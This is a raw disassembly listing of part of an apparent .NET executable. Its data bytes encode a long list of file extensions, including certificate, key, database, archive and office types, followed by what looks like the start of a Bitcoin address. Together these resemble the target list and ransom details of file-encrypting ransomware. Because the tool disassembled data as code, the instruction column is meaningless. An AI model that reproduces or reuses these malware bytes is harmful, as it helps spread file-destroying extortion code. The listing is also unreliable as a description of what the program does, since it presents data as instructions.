  406364:	69 00 63 00 74 00    	imul   $0x740063,(%eax),%eax
  40636a:	00 0b                	add    %cl,(%ebx)
  40636c:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  406370:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  406374:	65 00 00             	add    %al,%gs:(%eax)
  406377:	09 2e                	or     %ebp,(%esi)
  406379:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40637d:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  406381:	09 2e                	or     %ebp,(%esi)
  406383:	00 66 00             	add    %ah,0x0(%esi)
  406386:	34 00                	xor    $0x0,%al
  406388:	76 00                	jbe    0x40638a
  40638a:	00 09                	add    %cl,(%ecx)
  40638c:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  406390:	78 00                	js     0x406392
  406392:	72 00                	jb     0x406394
  406394:	00 09                	add    %cl,(%ecx)
  406396:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  40639a:	77 00                	ja     0x40639c
  40639c:	6d                   	insl   (%dx),%es:(%edi)
  40639d:	00 00                	add    %al,(%eax)
  40639f:	09 2e                	or     %ebp,(%esi)
  4063a1:	00 6d 00             	add    %ch,0x0(%ebp)
  4063a4:	61                   	popa
  4063a5:	00 78 00             	add    %bh,0x0(%eax)
  4063a8:	00 09                	add    %cl,(%ecx)
  4063aa:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4063ae:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4063b2:	00 09                	add    %cl,(%ecx)
  4063b4:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4063b8:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4063bc:	00 09                	add    %cl,(%ecx)
  4063be:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4063c2:	64 00 66 00          	add    %ah,%fs:0x0(%esi)
  4063c6:	00 09                	add    %cl,(%ecx)
  4063c8:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4063cc:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  4063d0:	00 09                	add    %cl,(%ecx)
  4063d2:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4063d6:	68 00 74 00 00       	push   $0x7400
  4063db:	09 2e                	or     %ebp,(%esi)
  4063dd:	00 6d 00             	add    %ch,0x0(%ebp)
  4063e0:	70 00                	jo     0x4063e2
  4063e2:	76 00                	jbe    0x4063e4
  4063e4:	00 09                	add    %cl,(%ecx)
  4063e6:	2e 00 6d 00          	add    %ch,%cs:0x0(%ebp)
  4063ea:	73 00                	jae    0x4063ec
  4063ec:	67 00 00             	add    %al,(%bx,%si)
  4063ef:	09 2e                	or     %ebp,(%esi)
  4063f1:	00 6d 00             	add    %ch,0x0(%ebp)
  4063f4:	79 00                	jns    0x4063f6
  4063f6:	69 00 00 09 2e 00    	imul   $0x2e0900,(%eax),%eax
  4063fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4063fd:	00 65 00             	add    %ah,0x0(%ebp)
  406400:	66 00 00             	data16 add %al,(%eax)
  406403:	09 2e                	or     %ebp,(%esi)
  406405:	00 6f 00             	add    %ch,0x0(%edi)
  406408:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40640c:	00 09                	add    %cl,(%ecx)
  40640e:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  406412:	65 00 6f 00          	add    %ch,%gs:0x0(%edi)
  406416:	00 0d 2e 00 73 00    	add    %cl,0x73002e
  40641c:	77 00                	ja     0x40641e
  40641e:	69 00 66 00 74 00    	imul   $0x740066,(%eax),%eax
  406424:	00 09                	add    %cl,(%ecx)
  406426:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40642a:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40642e:	00 09                	add    %cl,(%ecx)
  406430:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  406434:	64 00 70 00          	add    %dh,%fs:0x0(%eax)
  406438:	00 09                	add    %cl,(%ecx)
  40643a:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40643e:	66 00 74 00 00       	data16 add %dh,0x0(%eax,%eax,1)
  406443:	09 2e                	or     %ebp,(%esi)
  406445:	00 6f 00             	add    %ch,0x0(%edi)
  406448:	72 00                	jb     0x40644a
  40644a:	66 00 00             	data16 add %al,(%eax)
  40644d:	09 2e                	or     %ebp,(%esi)
  40644f:	00 70 00             	add    %dh,0x0(%eax)
  406452:	66 00 78 00          	data16 add %bh,0x0(%eax)
  406456:	00 09                	add    %cl,(%ecx)
  406458:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40645c:	31 00                	xor    %eax,(%eax)
  40645e:	32 00                	xor    (%eax),%al
  406460:	00 07                	add    %al,(%edi)
  406462:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406466:	6c                   	insb   (%dx),%es:(%edi)
  406467:	00 00                	add    %al,(%eax)
  406469:	09 2e                	or     %ebp,(%esi)
  40646b:	00 70 00             	add    %dh,0x0(%eax)
  40646e:	6c                   	insb   (%dx),%es:(%edi)
  40646f:	00 73 00             	add    %dh,0x0(%ebx)
  406472:	00 0b                	add    %cl,(%ebx)
  406474:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  406478:	61                   	popa
  406479:	00 66 00             	add    %ah,0x0(%esi)
  40647c:	65 00 00             	add    %al,%gs:(%eax)
  40647f:	09 2e                	or     %ebp,(%esi)
  406481:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  406485:	00 62 00             	add    %ah,0x0(%edx)
  406488:	00 09                	add    %cl,(%ecx)
  40648a:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  40648e:	62 00                	bound  %eax,(%eax)
  406490:	73 00                	jae    0x406492
  406492:	00 09                	add    %cl,(%ecx)
  406494:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  406498:	6c                   	insb   (%dx),%es:(%edi)
  406499:	00 6b 00             	add    %ch,0x0(%ebx)
  40649c:	00 09                	add    %cl,(%ecx)
  40649e:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  4064a2:	6c                   	insb   (%dx),%es:(%edi)
  4064a3:	00 6d 00             	add    %ch,0x0(%ebp)
  4064a6:	00 09                	add    %cl,(%ecx)
  4064a8:	2e 00 78 00          	add    %bh,%cs:0x0(%eax)
  4064ac:	6c                   	insb   (%dx),%es:(%edi)
  4064ad:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  4064b1:	0b 2e                	or     (%esi),%ebp
  4064b3:	00 78 00             	add    %bh,0x0(%eax)
  4064b6:	6c                   	insb   (%dx),%es:(%edi)
  4064b7:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  4064bb:	00 00                	add    %al,(%eax)
  4064bd:	0b 2e                	or     (%esi),%ebp
  4064bf:	00 73 00             	add    %dh,0x0(%ebx)
  4064c2:	76 00                	jbe    0x4064c4
  4064c4:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  4064c8:	00 09                	add    %cl,(%ecx)
  4064ca:	2e 00 73 00          	add    %dh,%cs:0x0(%ebx)
  4064ce:	6c                   	insb   (%dx),%es:(%edi)
  4064cf:	00 6b 00             	add    %ch,0x0(%ebx)
  4064d2:	00 0f                	add    %cl,(%edi)
  4064d4:	2e 00 74 00 61       	add    %dh,%cs:0x61(%eax,%eax,1)
  4064d9:	00 72 00             	add    %dh,0x0(%edx)
  4064dc:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  4064e0:	7a 00                	jp     0x4064e2
  4064e2:	00 09                	add    %cl,(%ecx)
  4064e4:	2e 00 64 00 6d       	add    %ah,%cs:0x6d(%eax,%eax,1)
  4064e9:	00 67 00             	add    %ah,0x0(%edi)
  4064ec:	00 07                	add    %al,(%edi)
  4064ee:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4064f2:	73 00                	jae    0x4064f4
  4064f4:	00 09                	add    %cl,(%ecx)
  4064f6:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  4064fa:	73 00                	jae    0x4064fc
  4064fc:	62 00                	bound  %eax,(%eax)
  4064fe:	00 09                	add    %cl,(%ecx)
  406500:	2e 00 74 00 69       	add    %dh,%cs:0x69(%eax,%eax,1)
  406505:	00 66 00             	add    %ah,0x0(%esi)
  406508:	00 09                	add    %cl,(%ecx)
  40650a:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  40650e:	73 00                	jae    0x406510
  406510:	73 00                	jae    0x406512
  406512:	00 09                	add    %cl,(%ecx)
  406514:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  406518:	65 00 79 00          	add    %bh,%gs:0x0(%ecx)
  40651c:	00 09                	add    %cl,(%ecx)
  40651e:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  406522:	6f                   	outsl  %ds:(%esi),(%dx)
  406523:	00 62 00             	add    %ah,0x0(%edx)
  406526:	00 0b                	add    %cl,(%ebx)
  406528:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40652c:	70 00                	jo     0x40652e
  40652e:	73 00                	jae    0x406530
  406530:	70 00                	jo     0x406532
  406532:	00 09                	add    %cl,(%ecx)
  406534:	2e 00 64 00 63       	add    %ah,%cs:0x63(%eax,%eax,1)
  406539:	00 33                	add    %dh,(%ebx)
  40653b:	00 00                	add    %al,(%eax)
  40653d:	09 2e                	or     %ebp,(%esi)
  40653f:	00 69 00             	add    %ch,0x0(%ecx)
  406542:	66 00 66 00          	data16 add %ah,0x0(%esi)
  406546:	00 11                	add    %dl,(%ecx)
  406548:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40654c:	6e                   	outsb  %ds:(%esi),(%dx)
  40654d:	00 65 00             	add    %ah,0x0(%ebp)
  406550:	74 00                	je     0x406552
  406552:	6f                   	outsl  %ds:(%esi),(%dx)
  406553:	00 63 00             	add    %ah,0x0(%ebx)
  406556:	32 00                	xor    (%eax),%al
  406558:	00 09                	add    %cl,(%ecx)
  40655a:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  40655e:	70 00                	jo     0x406560
  406560:	74 00                	je     0x406562
  406562:	00 09                	add    %cl,(%ecx)
  406564:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406568:	37                   	aaa
  406569:	00 62 00             	add    %ah,0x0(%edx)
  40656c:	00 09                	add    %cl,(%ecx)
  40656e:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  406572:	61                   	popa
  406573:	00 6d 00             	add    %ch,0x0(%ebp)
  406576:	00 09                	add    %cl,(%ecx)
  406578:	2e 00 72 00          	add    %dh,%cs:0x0(%edx)
  40657c:	33 00                	xor    (%eax),%eax
  40657e:	64 00 00             	add    %al,%fs:(%eax)
  406581:	07                   	pop    %es
  406582:	62 00                	bound  %eax,(%eax)
  406584:	63 00                	arpl   %eax,(%eax)
  406586:	31 00                	xor    %eax,(%eax)
  406588:	00 00                	add    %al,(%eax)
  40658a:	00 00                	add    %al,(%eax)
  40658c:	43                   	inc    %ebx
  40658d:	16                   	push   %ss
  40658e:	31 fe                	xor    %edi,%esi
  406590:	4c                   	dec    %esp
  406591:	f6 00 4c             	testb  $0x4c,(%eax)
  406594:	ad                   	lods   %ds:(%esi),%eax
  406595:	1d 0b 5d 19 e2       	sbb    $0xe2195d0b,%eax
  40659a:	8b 61 00             	mov    0x0(%ecx),%esp
  40659d:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  4065a3:	34 e0                	xor    $0xe0,%al
  4065a5:	89 02                	mov    %eax,(%edx)
  4065a7:	06                   	push   %es
  4065a8:	0e                   	push   %cs
  4065a9:	02 06                	add    (%esi),%al
  4065ab:	02 02                	add    (%edx),%al
  4065ad:	06                   	push   %es
  4065ae:	08 03                	or     %al,(%ebx)
  4065b0:	06                   	push   %es
  4065b1:	12 0d 03 06 1d 0e    	adc    0xe1d0603,%cl
  4065b7:	07                   	pop    %es
  4065b8:	00 04 08             	add    %al,(%eax,%ecx,1)
  4065bb:	09 09                	or     %ecx,(%ecx)
  4065bd:	0e                   	push   %cs
  4065be:	09 05 00 01 01 1d    	or     %eax,0x1d010100
  4065c4:	0e                   	push   %cs
  4065c5:	03 00                	add    (%eax),%eax
  4065c7:	00 01                	add    %al,(%ecx)
  4065c9:	03 00                	add    (%eax),%eax
  4065cb:	00 02                	add    %al,(%edx)
  4065cd:	05 00 01 1d 05       	add    $0x51d0100,%eax
  4065d2:	08 03                	or     %al,(%ebx)
  4065d4:	06                   	push   %es
  4065d5:	12 11                	adc    (%ecx),%dl
  4065d7:	04 00                	add    $0x0,%al
  4065d9:	01 0e                	add    %ecx,(%esi)
  4065db:	08 04 00             	or     %al,(%eax,%eax,1)
  4065de:	01 0e                	add    %ecx,(%esi)
  4065e0:	0e                   	push   %cs
  4065e1:	04 00                	add    $0x0,%al
  4065e3:	01 01                	add    %eax,(%ecx)
  4065e5:	0e                   	push   %cs
  4065e6:	03 00                	add    (%eax),%eax
  4065e8:	00 0e                	add    %cl,(%esi)
  4065ea:	08 00                	or     %al,(%eax)
  4065ec:	02 1d 05 1d 05 1d    	add    0x1d051d05,%bl
  4065f2:	05 05 00 02 0e       	add    $0xe020005,%eax
  4065f7:	0e                   	push   %cs
  4065f8:	0e                   	push   %cs
  4065f9:	03 20                	add    (%eax),%esp
  4065fb:	00 01                	add    %al,(%ecx)
  4065fd:	04 1d                	add    $0x1d,%al
  4065ff:	03 00                	add    (%eax),%eax
  406601:	00 04 00             	add    %al,(%eax,%eax,1)
  406604:	01 02                	add    %eax,(%edx)
  406606:	18 05 00 02 18 18    	sbb    %al,0x18180200
  40660c:	18 02                	sbb    %al,(%edx)
  40660e:	06                   	push   %es
  40660f:	18 05 20 01 02 12    	sbb    %al,0x12020120
  406615:	0d 06 20 01 01       	or     $0x1012006,%eax
  40661a:	10 11                	adc    %dl,(%ecx)
  40661c:	15 04 20 00 12       	adc    $0x12002004,%eax
  406621:	19 04 28             	sbb    %eax,(%eax,%ebp,1)
  406624:	00 12                	add    %dl,(%edx)
  406626:	19 05 20 01 01 11    	sbb    %eax,0x11010120
  40662c:	21 01                	and    %eax,(%ecx)
  40662e:	02 04 20             	add    (%eax,%eiz,1),%al
  406631:	01 01                	add    %eax,(%ecx)
  406633:	08 04 20             	or     %al,(%eax,%eiz,1)
  406636:	01 01                	add    %eax,(%ecx)
  406638:	0e                   	push   %cs
  406639:	03 06                	add    (%esi),%eax
  40663b:	12 31                	adc    (%ecx),%dh
  40663d:	04 01                	add    $0x1,%al
  40663f:	00 00                	add    %al,(%eax)
  406641:	00 04 00             	add    %al,(%eax,%eax,1)
  406644:	01 01                	add    %eax,(%ecx)
  406646:	08 05 20 02 01 1c    	or     %al,0x1c010220
  40664c:	18 05 20 01 01 12    	sbb    %al,0x12010120
  406652:	31 05 00 01 01 12    	xor    %eax,0x12010100
  406658:	09 04 00             	or     %eax,(%eax,%eax,1)
  40665b:	00 12                	add    %dl,(%edx)
  40665d:	45                   	inc    %ebp
  40665e:	03 20                	add    (%eax),%esp
  406660:	00 0e                	add    %cl,(%esi)
  406662:	05 00 01 0e 11       	add    $0x110e0100,%eax
  406667:	4d                   	dec    %ebp
  406668:	05 00 02 02 0e       	add    $0xe020200,%eax
  40666d:	0e                   	push   %cs
  40666e:	04 07                	add    $0x7,%al
  406670:	02 0e                	add    (%esi),%cl
  406672:	0e                   	push   %cs
  406673:	05 00 00 1d 12       	add    $0x121d0000,%eax
  406678:	55                   	push   %ebp
  406679:	04 00                	add    $0x0,%al
  40667b:	00 12                	add    %dl,(%edx)
  40667d:	55                   	push   %ebp
  40667e:	04 20                	add    $0x20,%al
  406680:	00 12                	add    %dl,(%edx)
  406682:	59                   	pop    %ecx
  406683:	05 20 01 12 5d       	add    $0x5d120120,%eax
  406688:	08 03                	or     %al,(%ebx)
  40668a:	20 00                	and    %al,(%eax)
  40668c:	08 0e                	or     %cl,(%esi)
  40668e:	07                   	pop    %es
  40668f:	06                   	push   %es
  406690:	1d 12 55 12 55       	sbb    $0x55125512,%eax
  406695:	12 55 02             	adc    0x2(%ebp),%dl
  406698:	1d 12 55 08 05       	sbb    $0x5085512,%eax
  40669d:	20 01                	and    %al,(%ecx)
  40669f:	01 1d 05 06 07 02    	add    %ebx,0x2070605
  4066a5:	12 11                	adc    (%ecx),%dl
  4066a7:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  4066ac:	08 08                	or     %cl,(%eax)
  4066ae:	08 04 20             	or     %al,(%eax,%eiz,1)
  4066b1:	01 03                	add    %eax,(%ebx)
  4066b3:	08 05 20 01 12 69    	or     %al,0x69120120
  4066b9:	03 06                	add    (%esi),%eax
  4066bb:	07                   	pop    %es
  4066bc:	03 12                	add    (%edx),%edx
  4066be:	69 08 03 04 00 00    	imul   $0x403,(%eax),%ecx
  4066c4:	12 6d 05             	adc    0x5(%ebp),%ch
  4066c7:	20 01                	and    %al,(%ecx)
  4066c9:	1d 05 0e 05 00       	sbb    $0x50e05,%eax
  4066ce:	01 0e                	add    %ecx,(%esi)
  4066d0:	1d 05 04 07 01       	sbb    $0x1070405,%eax
  4066d5:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  4066da:	0e                   	push   %cs
  4066db:	1d 0e 06 07 02       	sbb    $0x207060e,%eax
  4066e0:	1d 05 1d 0e 04       	sbb    $0x40e1d05,%eax
  4066e5:	20 01                	and    %al,(%ecx)
  4066e7:	02 0e                	add    (%esi),%cl
  4066e9:	05 00 01 1d 0e       	add    $0xe1d0100,%eax
  4066ee:	0e                   	push   %cs
  4066ef:	05 15 12 79 01       	add    $0x1791215,%eax
  4066f4:	0e                   	push   %cs
  4066f5:	0d 10 01 02 02       	or     $0x2020110,%eax
  4066fa:	1d 1e 00 15 12       	sbb    $0x1215001e,%eax
  4066ff:	79 01                	jns    0x406702
  406701:	1e                   	push   %ds
  406702:	00 03                	add    %al,(%ebx)
  406704:	0a 01                	or     (%ecx),%al
  406706:	0e                   	push   %cs
  406707:	06                   	push   %es
  406708:	20 01                	and    %al,(%ecx)
  40670a:	01 11                	add    %edx,(%ecx)
  40670c:	80 89 03 20 00 0a 05 	orb    $0x5,0xa002003(%ecx)
  406713:	20 01                	and    %al,(%ecx)
  406715:	0e                   	push   %cs
  406716:	1d 05 05 00 02       	sbb    $0x2000505,%eax
  40671b:	01 0e                	add    %ecx,(%esi)
  40671d:	0e                   	push   %cs
  40671e:	06                   	push   %es
  40671f:	00 03                	add    %al,(%ebx)
  406721:	0e                   	push   %cs
  406722:	0e                   	push   %cs
  406723:	0e                   	push   %cs
  406724:	0e                   	push   %cs
  406725:	04 00                	add    $0x0,%al
  406727:	01 08                	add    %ecx,(%eax)
  406729:	0a 06                	or     (%esi),%al
  40672b:	00 02                	add    %al,(%edx)
  40672d:	01 0e                	add    %ecx,(%esi)
  40672f:	1d 0e 14 07 0c       	sbb    $0xc07140e,%eax
  406734:	1d 0e 02 08 0e       	sbb    $0xe08020e,%eax
  406739:	12 80 81 12 11 08    	adc    0x8111281(%eax),%al
  40673f:	0e                   	push   %cs
  406740:	0e                   	push   %cs
  406741:	12 18                	adc    (%eax),%bl
  406743:	1d 0e 08 04 07       	sbb    $0x704080e,%eax
  406748:	01 12                	add    %edx,(%edx)
  40674a:	69 04 20 01 08 08 06 	imul   $0x6080801,(%eax,%eiz,1),%eax
  406751:	07                   	pop    %es
  406752:	02 12                	add    (%edx),%dl
  406754:	69 12 11 02 06 0a    	imul   $0xa060211,(%edx),%edx
  40675a:	08 00                	or     %al,(%eax)
  40675c:	02 01                	add    (%ecx),%al
  40675e:	12 7d 11             	adc    0x11(%ebp),%bh
  406761:	80 95 08 20 03 01 1d 	adcb   $0x1d,0x1032008(%ebp)
  406768:	05 1d 05 08 05       	add    $0x508051d,%eax
  40676d:	20 01                	and    %al,(%ecx)
  40676f:	1d 05 08 06 20       	sbb    $0x20060805,%eax
  406774:	01 01                	add    %eax,(%ecx)
  406776:	11 80 ad 05 20 00    	adc    %eax,0x2005ad(%eax)
  40677c:	12 80 b1 0c 20 03    	adc    0x3200cb1(%eax),%al
  406782:	01 12                	add    %edx,(%edx)
  406784:	80 b9 12 80 b1 11 80 	cmpb   $0x80,0x11b18012(%ecx)
  40678b:	bd 07 20 03 01       	mov    $0x1032007,%ebp
  406790:	1d 05 08 08 04       	sbb    $0x4080805,%eax
  406795:	20 00                	and    %al,(%eax)
  406797:	1d 05 12 07 06       	sbb    $0x6071205,%eax
  40679c:	1d 05 1d 05 12       	sbb    $0x12051d05,%eax
  4067a1:	80 99 12 80 9d 12 80 	sbbb   $0x80,0x129d8012(%ecx)
  4067a8:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4067a9:	12 80 b5 05 00 01    	adc    0x10005b5(%eax),%al
  4067af:	1d 05 0e 07 00       	sbb    $0x70e05,%eax
  4067b4:	04 0e                	add    $0xe,%al
  4067b6:	0e                   	push   %cs
  4067b7:	0e                   	push   %cs
  4067b8:	0e                   	push   %cs
  4067b9:	0e                   	push   %cs
  4067ba:	09 07                	or     %eax,(%edi)
  4067bc:	04 1d                	add    $0x1d,%al
  4067be:	05 0e 1d 05 1d       	add    $0x1d051d0e,%eax
  4067c3:	05 07 20 02 1d       	add    $0x1d022007,%eax
  4067c8:	05 1d 05 02 04       	add    $0x402051d,%eax
  4067cd:	20 01                	and    %al,(%ecx)
  4067cf:	01 02                	add    %eax,(%edx)
  4067d1:	0b 07                	or     (%edi),%eax
  4067d3:	05 1d 05 12 80       	add    $0x8012051d,%eax
  4067d8:	c5 1d 05 0e 0e 06    	lds    0x60e0e05,%ebx
  4067de:	00 00                	add    %al,(%eax)
  4067e0:	1d 12 80 cd 17       	sbb    $0x17cd8012,%eax
  4067e5:	07                   	pop    %es
  4067e6:	10 12                	adc    %dl,(%edx)
  4067e8:	80 cd 0e             	or     $0xe,%ch
  4067eb:	0e                   	push   %cs
  4067ec:	0e                   	push   %cs
  4067ed:	0e                   	push   %cs
  4067ee:	0e                   	push   %cs
  4067ef:	0e                   	push   %cs
  4067f0:	0e                   	push   %cs
  4067f1:	0e                   	push   %cs
  4067f2:	0e                   	push   %cs
  4067f3:	0e                   	push   %cs
  4067f4:	0e                   	push   %cs
  4067f5:	0e                   	push   %cs
  4067f6:	0e                   	push   %cs
  4067f7:	1d 12 80 cd 08       	sbb    $0x8cd8012,%eax
  4067fc:	05 00 00 12 80       	add    $0x80120000,%eax
  406801:	d1 04 00             	roll   $1,(%eax,%eax,1)
  406804:	01 02                	add    %eax,(%edx)
  406806:	0e                   	push   %cs
  406807:	06                   	push   %es
  406808:	20 01                	and    %al,(%ecx)
  40680a:	01 12                	add    %edx,(%edx)
  40680c:	80 d5 03             	adc    $0x3,%ch
  40680f:	20 00                	and    %al,(%eax)
  406811:	02 11                	add    (%ecx),%dl
  406813:	07                   	pop    %es
  406814:	09 0e                	or     %ecx,(%esi)
  406816:	0e                   	push   %cs
  406817:	0e                   	push   %cs
  406818:	0e                   	push   %cs
  406819:	0e                   	push   %cs
  40681a:	12 80 d5 12 55 12    	adc    0x125512d5(%eax),%al
  406820:	80 d5 12             	adc    $0x12,%ch
  406823:	55                   	push   %ebp
  406824:	06                   	push   %es
  406825:	20 01                	and    %al,(%ecx)
  406827:	01 11                	add    %edx,(%ecx)
  406829:	80 d9 07             	sbb    $0x7,%cl
  40682c:	00 01                	add    %al,(%ecx)
  40682e:	12 55 12             	adc    0x12(%ebp),%dl
  406831:	80 d5 15             	adc    $0x15,%ch
  406834:	07                   	pop    %es
  406835:	0a 0e                	or     (%esi),%cl
  406837:	0e                   	push   %cs
  406838:	0e                   	push   %cs
  406839:	0e                   	push   %cs
  40683a:	0e                   	push   %cs
  40683b:	12 80 d5 12 55 12    	adc    0x125512d5(%eax),%al
  406841:	80 dd 12             	sbb    $0x12,%ch
  406844:	80 dd 12             	sbb    $0x12,%ch
  406847:	80 d5 05             	adc    $0x5,%ch
  40684a:	20 02                	and    %al,(%edx)
  40684c:	0e                   	push   %cs
  40684d:	03 03                	add    (%ebx),%eax
  40684f:	09 07                	or     %eax,(%edi)
  406851:	05 0e 0e 12 80       	add    $0x80120e0e,%eax
  406856:	e1 0e                	loope  0x406866
  406858:	0e                   	push   %cs
  406859:	05 00 01 12 55       	add    $0x55120100,%eax
  40685e:	0e                   	push   %cs
  40685f:	03 07                	add    (%edi),%eax
  406861:	01 0e                	add    %ecx,(%esi)
  406863:	04 06                	add    $0x6,%al
  406865:	12 80 ed 07 20 02    	adc    0x22007ed(%eax),%al
  40686b:	12 80 ed 0e 02 05    	adc    0x5020eed(%eax),%al
  406871:	20 02                	and    %al,(%edx)
  406873:	01 0e                	add    %ecx,(%esi)
  406875:	1c 05                	sbb    $0x5,%al
  406877:	07                   	pop    %es
  406878:	01 12                	add    %edx,(%edx)
  40687a:	80 ed 0a             	sub    $0xa,%ch
  40687d:	07                   	pop    %es
  40687e:	03 12                	add    (%edx),%edx
  406880:	80 cd 1d             	or     $0x1d,%ch
  406883:	12 80 cd 08 07 07    	adc    0x70708cd(%eax),%al
  406889:	02 12                	add    (%edx),%dl
  40688b:	55                   	push   %ebp
  40688c:	12 80 d5 06 00 02    	adc    0x20006d5(%eax),%al
  406892:	01 0e                	add    %ecx,(%esi)
  406894:	1d 05 06 07 02       	sbb    $0x2070605,%eax
  406899:	1d 0e 1d 0e 03       	sbb    $0x30e1d0e,%eax
  40689e:	20 00                	and    %al,(%eax)
  4068a0:	18 06                	sbb    %al,(%esi)
  4068a2:	20 01                	and    %al,(%ecx)
  4068a4:	12 80 f9 0e 05 20    	adc    0x20050ef9(%eax),%al
  4068aa:	02 0e                	add    (%esi),%cl
  4068ac:	0e                   	push   %cs
  4068ad:	0e                   	push   %cs
  4068ae:	04 07                	add    $0x7,%al
  4068b0:	01 12                	add    %edx,(%edx)
  4068b2:	19 06                	sbb    %eax,(%esi)
  4068b4:	20 01                	and    %al,(%ecx)
  4068b6:	01 11                	add    %edx,(%ecx)
  4068b8:	81 05 06 07 02 12 3d 	addl   $0x620123d,0x12020706
  4068bf:	12 20 06 
  4068c2:	07                   	pop    %es
  4068c3:	02 12                	add    (%edx),%dl
  4068c5:	3d 12 24 08 01       	cmp    $0x1082412,%eax
  4068ca:	00 08                	add    %cl,(%eax)
  4068cc:	00 00                	add    %al,(%eax)
  4068ce:	00 00                	add    %al,(%eax)
  4068d0:	00 1e                	add    %bl,(%esi)
  4068d2:	01 00                	add    %eax,(%eax)
  4068d4:	01 00                	add    %eax,(%eax)
  4068d6:	54                   	push   %esp
  4068d7:	02 16                	add    (%esi),%dl
  4068d9:	57                   	push   %edi
  4068da:	72 61                	jb     0x40693d
  4068dc:	70 4e                	jo     0x40692c
  4068de:	6f                   	outsl  %ds:(%esi),(%dx)
  4068df:	6e                   	outsb  %ds:(%esi),(%dx)
  4068e0:	45                   	inc    %ebp
  4068e1:	78 63                	js     0x406946
  4068e3:	65 70 74             	gs jo  0x40695a
  4068e6:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  4068ed:	77 73                	ja     0x406962
  4068ef:	01 18                	add    %ebx,(%eax)
  4068f1:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  4068f7:	00 00                	add    %al,(%eax)
  4068f9:	00 00                	add    %al,(%eax)
  4068fb:	00 2e                	add    %ch,(%esi)
  4068fd:	69 00 00 00 20 00    	imul   $0x200000,(%eax),%eax
	...
  406917:	00 20                	add    %ah,(%eax)
  406919:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  40691f:	00 00                	add    %al,(%eax)
  406921:	00 5f 43             	add    %bl,0x43(%edi)
  406924:	6f                   	outsl  %ds:(%esi),(%dx)
  406925:	72 45                	jb     0x40696c
  406927:	78 65                	js     0x40698e
  406929:	4d                   	dec    %ebp
  40692a:	61                   	popa
  40692b:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  406932:	72 65                	jb     0x406999
  406934:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  406938:	6c                   	insb   (%dx),%es:(%edi)
  406939:	00 00                	add    %al,(%eax)
  40693b:	00 00                	add    %al,(%eax)
  40693d:	00 ff                	add    %bh,%bh
  40693f:	25 00 20 40 00       	and    $0x402000,%eax
